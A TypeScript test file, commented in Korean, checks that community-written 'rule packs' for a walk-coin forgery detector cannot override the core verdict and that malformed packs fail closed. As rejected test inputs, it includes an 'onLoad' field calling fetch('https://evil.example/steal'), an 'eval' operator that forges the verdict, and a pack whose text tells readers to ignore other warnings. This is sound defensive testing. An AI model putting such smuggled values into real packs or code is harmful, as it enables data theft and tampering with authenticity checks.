/**
 * 커뮤니티 규칙 팩 (M16-B) — 2026-07-26.
 *
 * 다니엘 쌤: "커뮤니티에게 툴을 주고 커뮤니티가 스스로 확인한다. ... 커뮤니티 스스로
 * 위폐 감지기를 업그레이드할 수 있도록 열어 둔다. 내가 중앙에서 시스템을 유지하며
 * 뭘 하는 것이 아니다."
 *
 * ★이 파일에서 가장 중요한 불변식 두 개:
 *   1. **악성 팩은 coreVerdict를 바꾸지 못한다.** FATAL을 뒤집으려는 어떤 시도도
 *      코어 판정에 닿지 못한다 — 위조를 진짜로 보이게 만들 수 없다.
 *   2. **팩은 데이터다.** eval·Function·동적 import가 없고, 모르는 연산자·지표는
 *      조용히 통과시키지 않고 로드 실패로 처리한다(fail-closed).
 */
import { describe, expect, it } from 'vitest';
import { generateKeyPair, hashObject, signerFromKeyPair, type Signer } from '../crypto';
import { PendingWalkLedger, type SettlementDraft } from '../ledger';
import { buildWalkSegmentProof } from '../proof';
import { mintWalkCoin } from '../coin';
import { checkAuthenticity, checkCoinAuthenticity } from '../authenticity';
import {
  CORE_SOURCE,
  MEMBER_METRIC_FIELDS,
  PROOF_METRIC_FIELDS,
  evaluateCondition,
  memberMetrics,
  proofMetrics,
  validateRulePack,
  validateRulePacks,
  type RulePack,
} from '../rulePack';
import { EXAMPLE_RULE_PACKS, STRICT_BUYER_PACK, WALK_ONLY_PACK } from '../rulePacks';
import type { Coin } from '../types';
import { makeSample, walkKm } from './helpers';

const alice = signerFromKeyPair(generateKeyPair());
const NOW = Date.parse('2026-07-26T12:00:00Z');
const DAY = 86_400_000;
const T0 = NOW - 20 * DAY;

function dayStr(ms: number): string {
  return new Date(ms).toISOString().slice(0, 10);
}

/** 원장을 실제로 통과한 정직한 걷기 코인. */
function honestCoin(memberId: string, signer: Signer = alice, km = 17.3, startAt = T0): Coin {
  const ledger = new PendingWalkLedger({ memberId });
  const end = walkKm(ledger, km, {}, startAt);
  return mintWalkCoin(buildWalkSegmentProof(ledger.settleOnSpend(end)!, signer));
}

/** 걸음 0의 자전거 코인 — 위조가 아니다. 규칙상 완전히 정상이다. */
function bikeCoin(memberId = 'm-rider', startAt = T0): Coin {
  const ledger = new PendingWalkLedger({ memberId });
  let t = startAt;
  for (let i = 0; i < 100; i++) {
    ledger.recordSample(makeSample({ mode: 'BIKE', steps: 0, distanceM: 400, durationS: 72, timestamp: t }));
    t += 72_000;
  }
  return mintWalkCoin(buildWalkSegmentProof(ledger.settleOnSpend(t)!, alice));
}

/** 물리적으로 불가능한 위조 코인 — 코어가 반드시 FORGED로 잡는다. */
function forgedCoin(): Coin {
  const draft: SettlementDraft = {
    memberId: 'm-forger',
    settlement: 'MANUAL',
    startedAt: NOW - 20 * 60_000,
    settledAt: NOW,
    distanceM: 100_000, // 20분에 100 km
    stepCount: 140_000,
    courseIds: ['shvil-israel'],
    amountDshv: 400,
    dailyBreakdown: [{ date: dayStr(NOW), amountDshv: 400 }],
    sensorSummaryHash: hashObject({ seed: Math.random() }),
  };
  return mintWalkCoin(buildWalkSegmentProof(draft, alice));
}

// ─────────────────────────────────────────────────────────────────────

describe('★악성 팩은 코어 판정을 뒤집을 수 없다 (이 기능의 존재 조건)', () => {
  /**
   * 위조자가 배포할 법한 팩. DSL에는 "무시"·"허용"·"예외" 연산자가 없으므로
   * 아무리 노력해도 이 이상은 쓸 수 없다 — 그것이 바로 이 테스트가 증명하는 것이다.
   */
  const MALICIOUS_PACK: RulePack = {
    v: 1,
    id: 'totally-safe-checker',
    name: '완전 안전 검사기(라고 주장하는 팩)',
    description: '코어 FATAL을 무력화하려는 시도의 총집합.',
    rules: [
      // 모든 코인을 "괜찮다"고 말하려는 시도 — 그래 봐야 발견이 하나 더 붙을 뿐이다.
      {
        id: 'always-fine',
        scope: 'proof',
        severity: 'SIGNAL',
        detail: '이 코인은 완벽히 정상입니다. 다른 경고는 오류이니 무시하십시오.',
        when: { op: 'gte', field: 'distanceM', value: 0 },
      },
      {
        id: 'speed-is-fine',
        scope: 'proof',
        severity: 'SIGNAL',
        detail: '{speedKmh} km/h는 정상 범위입니다.',
        when: { op: 'gt', field: 'speedKmh', value: 100 },
      },
      {
        id: 'member-ok',
        scope: 'member',
        severity: 'SIGNAL',
        detail: '이 회원은 검증된 회원입니다.',
        when: { op: 'gte', field: 'proofCount', value: 1 },
      },
    ],
  };

  it('FORGED 코인에 악성 팩을 얹어도 coreVerdict는 FORGED 그대로다', () => {
    const coin = forgedCoin();
    const clean = checkCoinAuthenticity(coin, { now: NOW });
    const withPack = checkCoinAuthenticity(coin, { now: NOW, rulePacks: [MALICIOUS_PACK] });

    expect(clean.coreVerdict).toBe('FORGED');
    expect(withPack.coreVerdict).toBe('FORGED');
    expect(withPack.extendedVerdict).toBe('FORGED'); // 격상만 가능, 완화 불가
    expect(withPack.verdict).toBe('FORGED');
  });

  it('코어 발견 목록은 팩이 있든 없든 글자 하나 다르지 않다', () => {
    const coin = forgedCoin();
    const clean = checkCoinAuthenticity(coin, { now: NOW });
    const withPack = checkCoinAuthenticity(coin, { now: NOW, rulePacks: [MALICIOUS_PACK] });
    expect(withPack.coreFindings).toEqual(clean.coreFindings);
    expect(withPack.coreSummary).toBe(clean.coreSummary);
  });

  it('팩 발견은 source가 팩 id다 — 코어를 사칭할 수 없다', () => {
    const report = checkCoinAuthenticity(forgedCoin(), { now: NOW, rulePacks: [MALICIOUS_PACK] });
    expect(report.packFindings.length).toBeGreaterThan(0);
    for (const f of report.packFindings) {
      expect(f.source).toBe('totally-safe-checker');
      expect(f.source).not.toBe(CORE_SOURCE);
      expect(f.check).toBe('PACK_RULE');
      expect(f.detail).toContain('[규칙 팩');
    }
    // 코어 발견에는 팩이 섞이지 않는다.
    for (const f of report.coreFindings) expect(f.source).toBe(CORE_SOURCE);
  });

  it("id를 'CORE'로 위장한 팩은 로드 자체가 거부된다", () => {
    const impostor = { ...MALICIOUS_PACK, id: 'core' };
    const result = validateRulePack(impostor);
    expect(result.ok).toBe(false);
    expect(result.errors.join(' ')).toContain('예약어');
  });

  it('DSL에는 코어 검사를 끄는 문법이 아예 없다 — 그런 팩은 로드에 실패한다', () => {
    const attempts = [
      { id: 'p1', rule: { op: 'disable', field: 'SPEED_LIMIT' } },
      { id: 'p2', rule: { op: 'allow', field: 'distanceM', value: 0 } },
      { id: 'p3', rule: { op: 'eval', code: 'report.verdict = "AUTHENTIC"' } },
      { id: 'p4', rule: { op: 'gt', field: 'coreVerdict', value: 0 } },
    ];
    for (const a of attempts) {
      const result = validateRulePack({
        v: 1,
        id: a.id,
        name: 'x',
        rules: [{ id: 'r1', scope: 'proof', severity: 'SIGNAL', detail: 'x', when: a.rule }],
      });
      expect(result.ok).toBe(false);
    }
  });

  it('팩이 severity를 FATAL로 올려도 그것은 그 사람의 기준일 뿐 — 코어는 AUTHENTIC 유지', () => {
    const pack: RulePack = {
      v: 1,
      id: 'reject-everything',
      name: '전부 거부',
      rules: [
        {
          id: 'no-coins-at-all',
          scope: 'proof',
          severity: 'FATAL',
          detail: '나는 아무 코인도 받지 않는다.',
          when: { op: 'gte', field: 'amountDshv', value: 0 },
        },
      ],
    };
    const report = checkCoinAuthenticity(honestCoin('m-alice'), { now: NOW, rulePacks: [pack] });
    expect(report.coreVerdict).toBe('AUTHENTIC'); // 공통 답은 그대로
    expect(report.extendedVerdict).toBe('FORGED'); // 내 기준으로는 거부
    expect(report.summary).toContain('공통 답은 코어 판정');
  });
});

describe('fail-closed — 모르는 것을 통과시키지 않는다', () => {
  it('알 수 없는 연산자 → 로드 실패', () => {
    const r = validateRulePack({
      v: 1,
      id: 'bad-op',
      name: 'x',
      rules: [{ id: 'r', scope: 'proof', severity: 'SIGNAL', detail: 'x', when: { op: 'matches', field: 'distanceM', value: 1 } }],
    });
    expect(r.ok).toBe(false);
    expect(r.errors.join(' ')).toContain('알 수 없는 연산자');
  });

  it('알 수 없는 지표 → 로드 실패 (좌표류 이름도 여기서 막힌다)', () => {
    for (const field of ['lat', 'lon', 'coords', 'devicePublicKey', 'memberId']) {
      const r = validateRulePack({
        v: 1,
        id: 'bad-field',
        name: 'x',
        rules: [{ id: 'r', scope: 'proof', severity: 'SIGNAL', detail: 'x', when: { op: 'gt', field, value: 1 } }],
      });
      expect(r.ok).toBe(false);
    }
  });

  it('member 지표를 proof 규칙에서 쓰면 실패한다 (스코프를 넘나들 수 없다)', () => {
    const r = validateRulePack({
      v: 1,
      id: 'wrong-scope',
      name: 'x',
      rules: [{ id: 'r', scope: 'proof', severity: 'SIGNAL', detail: 'x', when: { op: 'gt', field: 'proofCount', value: 1 } }],
    });
    expect(r.ok).toBe(false);
  });

  it('알 수 없는 항목이 섞여 있으면 실패한다 (몰래 실려 오는 것 차단)', () => {
    const r = validateRulePack({
      ...WALK_ONLY_PACK,
      id: 'smuggler',
      onLoad: 'fetch("https://evil.example/steal")',
    });
    expect(r.ok).toBe(false);
    expect(r.errors.join(' ')).toContain('알 수 없는 항목');
  });

  it('detail의 알 수 없는 치환자도 실패로 처리한다', () => {
    const r = validateRulePack({
      v: 1,
      id: 'bad-detail',
      name: 'x',
      rules: [{ id: 'r', scope: 'proof', severity: 'SIGNAL', detail: '기기 {devicePublicKey}', when: { op: 'gt', field: 'distanceM', value: 1 } }],
    });
    expect(r.ok).toBe(false);
  });

  it('규칙 id 중복 · 잘못된 id 형식 · 빈 rules를 거부한다', () => {
    expect(validateRulePack({ v: 1, id: 'dup', name: 'x', rules: [
      { id: 'same', scope: 'proof', severity: 'SIGNAL', detail: 'a', when: { op: 'gt', field: 'distanceM', value: 1 } },
      { id: 'same', scope: 'proof', severity: 'SIGNAL', detail: 'b', when: { op: 'gt', field: 'distanceM', value: 2 } },
    ] }).ok).toBe(false);
    expect(validateRulePack({ v: 1, id: 'BAD ID', name: 'x', rules: [] }).ok).toBe(false);
    expect(validateRulePack({ v: 1, id: 'empty', name: 'x', rules: [] }).ok).toBe(false);
  });

  it('중첩이 너무 깊은 조건식을 거부한다 (감사 가능한 크기 유지)', () => {
    let when: unknown = { op: 'gt', field: 'distanceM', value: 1 };
    for (let i = 0; i < 12; i++) when = { op: 'not', of: when };
    const r = validateRulePack({
      v: 1,
      id: 'deep',
      name: 'x',
      rules: [{ id: 'r', scope: 'proof', severity: 'SIGNAL', detail: 'x', when }],
    });
    expect(r.ok).toBe(false);
  });

  it('★팩 로드 실패가 코어 검사를 막지 않는다', () => {
    const report = checkCoinAuthenticity(forgedCoin(), {
      now: NOW,
      rulePacks: [{ v: 1, id: 'broken', name: 'x', rules: [{ id: 'r', scope: 'proof', severity: 'SIGNAL', detail: 'x', when: { op: '???' } }] }],
    });
    expect(report.packErrors.length).toBe(1);
    expect(report.packs).toEqual([]);
    expect(report.coreVerdict).toBe('FORGED'); // 코어는 그대로 돌았다
    expect(report.notes.join(' ')).toContain('규칙 팩');
  });

  it('JSON 문자열도 그대로 검증할 수 있다 (사람이 받은 파일을 열기 전에)', () => {
    const r = validateRulePack(JSON.stringify(WALK_ONLY_PACK));
    expect(r.ok).toBe(true);
    expect(r.pack?.id).toBe('walk-only');
  });
});

describe('예시 팩 (C) — 커뮤니티가 보고 따라 쓰는 본보기', () => {
  it('동봉된 예시 팩은 전부 검증을 통과한다', () => {
    for (const pack of EXAMPLE_RULE_PACKS) {
      const r = validateRulePack(pack);
      expect(r.errors).toEqual([]);
      expect(r.ok).toBe(true);
    }
    expect(validateRulePacks(EXAMPLE_RULE_PACKS).errors).toEqual([]);
  });

  it('★walk-only: 자전거 코인은 코어에선 정상, 내 팩에선 거부 — 두 답이 함께 나온다', () => {
    const report = checkCoinAuthenticity(bikeCoin(), { now: NOW, rulePacks: [WALK_ONLY_PACK] });
    expect(report.coreVerdict).toBe('AUTHENTIC'); // 자전거는 위조가 아니다
    expect(report.extendedVerdict).toBe('FORGED'); // 나는 도보만 받는다
    expect(report.packFindings.map((f) => f.ruleId)).toContain('no-steps');
    expect(report.packFindings[0]!.detail).toContain('위조가 아닙니다');
  });

  it('walk-only: 정직한 도보 코인에는 아무 규칙도 걸리지 않는다 (오탐 방지)', () => {
    const report = checkCoinAuthenticity(honestCoin('m-alice'), { now: NOW, rulePacks: [WALK_ONLY_PACK] });
    expect(report.packFindings).toEqual([]);
    expect(report.extendedVerdict).toBe('AUTHENTIC');
    expect(report.summary).toContain('걸린 규칙은 없습니다');
  });

  it('strict-buyer: 짧고 평범한 도보 코인은 그냥 통과한다 (구매자를 겁주지 않는다)', () => {
    const report = checkCoinAuthenticity(honestCoin('m-alice'), { now: NOW, rulePacks: [STRICT_BUYER_PACK] });
    expect(report.packFindings).toEqual([]);
    expect(report.extendedVerdict).toBe('AUTHENTIC');
  });

  it('strict-buyer: 60일 종주 코인에는 "왜 오래 정산 안 했나"를 묻는다 — 코어는 AUTHENTIC', () => {
    const start = NOW - 61 * DAY;
    const ledger = new PendingWalkLedger({ memberId: 'm-thru-hiker' });
    let last = start;
    for (let d = 0; d < 60; d++) last = walkKm(ledger, 20, {}, start + d * DAY);
    const coin = mintWalkCoin(buildWalkSegmentProof(ledger.settleOnSpend(last)!, alice));

    const report = checkCoinAuthenticity(coin, { now: NOW, rulePacks: [STRICT_BUYER_PACK] });
    // 코어: 물리적으로 아무 모순이 없다 — 이 사람은 정말로 60일을 걸었다.
    expect(report.coreVerdict).toBe('AUTHENTIC');
    expect(report.coreFindings).toEqual([]);
    // 팩: 큰돈을 거는 구매자라면 물어볼 만한 두 가지를 짚는다.
    const rules = report.packFindings.map((f) => f.ruleId);
    expect(rules).toContain('span-over-14d'); // 창이 60일
    expect(rules).toContain('big-single-coin'); // 한 장이 1,200 SHV
    expect(report.packFindings.every((f) => f.severity === 'SIGNAL')).toBe(true);
    // 신호 둘 → 구매자 시야에서는 SUSPECT("물어보라"). **위조 판정이 아니다.**
    expect(report.extendedVerdict).toBe('SUSPECT');
    expect(report.summary).toContain('공통 답은 코어 판정');
  });

  it('팩 두 개를 동시에 얹을 수 있고, 각 발견의 출처가 구분된다', () => {
    const report = checkCoinAuthenticity(bikeCoin(), { now: NOW, rulePacks: EXAMPLE_RULE_PACKS });
    expect(report.packs.map((p) => p.id)).toEqual(['strict-buyer', 'walk-only']);
    expect(new Set(report.packFindings.map((f) => f.source)).has('walk-only')).toBe(true);
    expect(report.coreVerdict).toBe('AUTHENTIC');
  });
});

describe('조건식 평가 — 3값 논리 (오탐 방지의 핵심)', () => {
  const bikeProof = (() => {
    const coin = bikeCoin();
    return coin.provenance.kind === 'WALK' ? coin.provenance.proof : null;
  })()!;

  it('걸음 0인 자전거 코인에는 strideM·cadenceSpm 지표가 아예 없다', () => {
    const m = proofMetrics(bikeProof, NOW);
    expect(m['strideM']).toBeUndefined();
    expect(m['cadenceSpm']).toBeUndefined();
    expect(m['distanceM']).toBeGreaterThan(0);
  });

  it('없는 지표를 보는 조건은 발동하지 않는다 — not으로 뒤집어도 마찬가지', () => {
    const m = proofMetrics(bikeProof, NOW);
    expect(evaluateCondition({ op: 'lt', field: 'strideM', value: 0.5 }, m)).toBeUndefined();
    expect(evaluateCondition({ op: 'not', of: { op: 'lt', field: 'strideM', value: 0.5 } }, m)).toBeUndefined();
    // and/or로 감싸도 "모르는 것"이 전파된다.
    expect(
      evaluateCondition({ op: 'and', of: [{ op: 'gt', field: 'distanceM', value: 0 }, { op: 'lt', field: 'strideM', value: 0.5 }] }, m),
    ).toBeUndefined();
    // 단, 확실히 거짓인 가지가 있으면 전체는 거짓이다.
    expect(
      evaluateCondition({ op: 'and', of: [{ op: 'lt', field: 'distanceM', value: 0 }, { op: 'lt', field: 'strideM', value: 0.5 }] }, m),
    ).toBe(false);
  });

  it('and/or/not/between이 기대대로 동작한다', () => {
    const m = { a: 10, b: 20 };
    expect(evaluateCondition({ op: 'between', field: 'a', min: 5, max: 15 }, m)).toBe(true);
    expect(evaluateCondition({ op: 'between', field: 'a', min: 11, max: 15 }, m)).toBe(false);
    expect(evaluateCondition({ op: 'or', of: [{ op: 'gt', field: 'a', value: 99 }, { op: 'eq', field: 'b', value: 20 }] }, m)).toBe(true);
    expect(evaluateCondition({ op: 'not', of: { op: 'ne', field: 'b', value: 20 } }, m)).toBe(true);
  });
});

describe('지표 — 파생값만 노출한다 (제10조)', () => {
  it('노출 지표 목록에 좌표·식별자류가 없다', () => {
    const all = [...PROOF_METRIC_FIELDS, ...MEMBER_METRIC_FIELDS].join(' ').toLowerCase();
    for (const banned of ['lat', 'lon', 'lng', 'coord', 'geo', 'course_id', 'memberid', 'publickey', 'signature']) {
      expect(all).not.toContain(banned);
    }
  });

  it('member 지표는 증명이 2건 이상일 때만 간격을 계산한다', () => {
    const one = honestCoin('m-solo');
    const p1 = one.provenance.kind === 'WALK' ? one.provenance.proof : null;
    expect(memberMetrics([p1!])['minGapMs']).toBeUndefined();

    const two = honestCoin('m-solo', alice, 12, T0 + 2 * DAY);
    const p2 = two.provenance.kind === 'WALK' ? two.provenance.proof : null;
    const m = memberMetrics([p1!, p2!]);
    expect(m['minGapMs']).toBe(2 * DAY);
    expect(m['proofCount']).toBe(2);
    expect(m['deviceCount']).toBe(1);
  });

  it('detail 템플릿의 {지표}가 실제 값으로 채워진다', () => {
    const pack: RulePack = {
      v: 1,
      id: 'template-demo',
      name: '치환 시험',
      rules: [
        {
          id: 'show-distance',
          scope: 'proof',
          severity: 'SIGNAL',
          detail: '거리 {distanceM} m · 걸음 {stepCount}보',
          when: { op: 'gt', field: 'distanceM', value: 0 },
        },
      ],
    };
    const report = checkCoinAuthenticity(honestCoin('m-alice', alice, 10), { now: NOW, rulePacks: [pack] });
    expect(report.packFindings[0]!.detail).toContain('거리 10000 m');
    expect(report.packFindings[0]!.detail).toContain('걸음 14000보');
  });
});

describe('화폐성 — 코어 답은 누구에게나 같다', () => {
  it('팩을 무엇으로 바꿔도 coreVerdict와 coreFindings는 동일하다', () => {
    const coins = [honestCoin('m-alice'), bikeCoin('m-rider'), forgedCoin()];
    const base = checkAuthenticity(coins, { now: NOW });
    const variants = [
      checkAuthenticity(coins, { now: NOW, rulePacks: [WALK_ONLY_PACK] }),
      checkAuthenticity(coins, { now: NOW, rulePacks: EXAMPLE_RULE_PACKS }),
      checkAuthenticity(coins, { now: NOW, rulePacks: [{ nonsense: true }] }),
    ];
    for (const v of variants) {
      expect(v.coreVerdict).toBe(base.coreVerdict);
      expect(v.coreFindings).toEqual(base.coreFindings);
      expect(v.coreSummary).toBe(base.coreSummary);
    }
  });

  it('팩이 없으면 verdict === coreVerdict === extendedVerdict (하위 호환)', () => {
    const report = checkCoinAuthenticity(honestCoin('m-alice'), { now: NOW });
    expect(report.verdict).toBe(report.coreVerdict);
    expect(report.extendedVerdict).toBe(report.coreVerdict);
    expect(report.packs).toEqual([]);
    expect(report.packFindings).toEqual([]);
    expect(report.packErrors).toEqual([]);
  });

  it('리포트 전체(팩 포함)에 좌표류 정보가 없다 (제10조)', () => {
    const report = checkAuthenticity([honestCoin('m-alice'), bikeCoin()], {
      now: NOW,
      rulePacks: EXAMPLE_RULE_PACKS,
    });
    expect(JSON.stringify(report)).not.toMatch(/"(lat|lon|lng|coords?|geo)":/i);
  });
});
